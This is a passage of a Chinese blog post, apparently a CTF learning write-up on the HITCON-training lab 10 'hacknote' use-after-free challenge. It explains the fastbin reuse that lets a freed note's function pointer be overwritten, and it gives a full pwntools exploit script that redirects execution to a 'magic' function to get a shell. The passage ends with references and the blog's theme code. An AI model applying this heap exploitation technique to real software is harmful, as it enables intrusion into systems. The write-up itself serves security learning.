+<li>释放 note1</li>
+<li>此时，大小为 16 的 fast bin chunk 中链表为 <code>note1-&gt;note0</code></li>
+<li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则，note2 其实会分配 note1 对应的内存块（因为我们先释放的是 note0 再释放的 note1，那么 note1 就是链表的尾部，fast bin 是先进后出的，直接对链表尾进行操作）</li>
+<li>所以 real content 对应的 chunk 其实是 note0</li>
+<li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数</li>
+</ul>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&#x27;./hacknote&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addnote</span>(<span class="hljs-params">size, content</span>):<br>    r.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    r.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delnote</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printnote</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br><br>magic = <span class="hljs-number">0x08048986</span><br><br>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">b&quot;aaaa&quot;</span>) <span class="hljs-comment"># add note 0</span><br>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">b&quot;ddaa&quot;</span>) <span class="hljs-comment"># add note 1</span><br><br>delnote(<span class="hljs-number">0</span>) <span class="hljs-comment"># delete note 0</span><br>delnote(<span class="hljs-number">1</span>) <span class="hljs-comment"># delete note 1</span><br><br>addnote(<span class="hljs-number">8</span>, p32(magic)) <span class="hljs-comment"># add note 2</span><br>printnote(<span class="hljs-number">0</span>) <span class="hljs-comment"># print note 0</span><br><br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/uaf-hitcon-lab10/getshell.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li><p>CTF-Wiki</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/#_3">Use After Free</a></li>
+</ul>
+</li>
+<li><p>CSDN</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/108797478">好好说话之Use After Free</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_57836225/article/details/143894272">PWN -UAF（Use After Free）漏洞解析</a></li>
+</ul>
+</li>
+<li><p>CNBLOGS</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/happynoy/p/16276285.html"> [BUUCTF]刷题记录:hitcontraining_uaf</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/welkinchan/p/12212989.html">UAF——use after free</a></li>
+</ul>
+</li>
+<li><p>Blogs</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://yufeiyu33.github.io/posts/41088.html">UAF漏洞（hitcontraining_uaf）</a></li>
+<li><a target="_blank" rel="noopener" href="https://yyyffff.github.io/2025/08/02/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/">一些题目记录 - HITCON-training lab 10 hacknote</a></li>
+<li><a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2025/03/02/Use-After-Free/#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">Use After Free</a></li>
+<li><a target="_blank" rel="noopener" href="https://darkwing.moe/2019/06/25/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B022-Use-After-Free/">Pwn学习笔记22:Use After Free</a></li>
+<li><a target="_blank" rel="noopener" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/">pwn入门-15-堆利用之Use-After-Free</a></li>
+</ul>
+</li>
+<li><p>先知</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6742">Hitcon Traning Lab10做题笔记 —— UAF漏洞分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13928">堆利用Use After Free 详解</a></li>
+<li><a target="_blank" rel="noopener" href="https://binhack.readthedocs.io/zh/latest/heap/uaf.html"> 二进制安全学习笔记 - 11.1. Use After Free</a></li>
+</ul>
+</li>
+<li><p>Bilibili</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1L8411m7xW/?spm_id_from=333.337.search-card.all.click&vd_source=302a892bb778bc77294aa18fcca329b7">Linux堆溢出Use After Free</a></li>
+</ul>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Heap/" class="print-no-link">#Heap</a>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+        <a href="/tags/UAF/" class="print-no-link">#UAF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>UAF学习记录</div>
+      <div>https://hanashigure.github.io/2026/02/20/use-after-free-learning/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>花時雨</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/02/24/buuctf-misc-1/" title="BUUCTF-Misc刷题记录">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BUUCTF-Misc刷题记录</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/02/14/hitcon-training-unlink/" title="hitcon-training-unlink writeup">
+                        <span class="hidden-mobile">hitcon-training-unlink writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/love.js"></script>
+<script src="/js/sakura.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
